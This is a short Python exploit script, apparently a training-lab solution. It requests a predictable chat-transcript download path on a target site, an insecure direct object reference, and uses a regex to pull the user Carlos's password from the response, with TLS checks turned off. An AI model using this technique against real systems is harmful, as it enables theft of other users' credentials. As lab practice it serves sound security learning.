import requests as rs
import sys
import urllib3
import re
from bs4 import BeautifulSoup as bs 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}


def retreive_carlos_password(s,url):
    chat_url = url + '/download-transcript/1.txt' 
    r = s.get(chat_url,verify=False,proxies=proxies)
    resp = r.text

    
    if 'password' in resp:
        sys.stdout.write("[+] Carlos Password found: \n")
        password = re.findall(r'password is (.*)\.',resp)
        return password
    else:
        sys.stdout.write("[-] Carlos Password not found\n")
        sys.exit(1)
        
        



def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage: python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]

    carlos_password = retreive_carlos_password(s,url)
    print(carlos_password[0])



if __name__ == "__main__":
    main()